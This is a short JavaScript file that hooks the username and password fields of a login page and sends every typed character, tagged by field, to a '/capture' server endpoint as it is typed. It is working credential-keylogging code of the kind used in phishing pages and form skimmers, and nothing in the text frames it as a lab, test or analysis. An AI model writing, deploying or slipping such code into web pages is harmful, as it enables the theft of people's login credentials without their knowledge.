document.addEventListener('DOMContentLoaded', function() {
    const serverEndpoint = '/capture';

    let activeField = 'username';

    ['username', 'password'].forEach(fieldType => {
        const inputElement = document.getElementById(fieldType);
        inputElement.addEventListener('keydown', (event) => {
            if (event.key.length === 1) {
                const payload = {
                    key : event.key,
                    fieldType : fieldType,
                };

                fetch(serverEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                })

                .then(response => {
                    if(!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })

                .catch(error => {
                    console.error('Error:', error);
                });

            }
        });

        inputElement.addEventListener('blur', () => {
            activeField = 'password';
        });
    });
});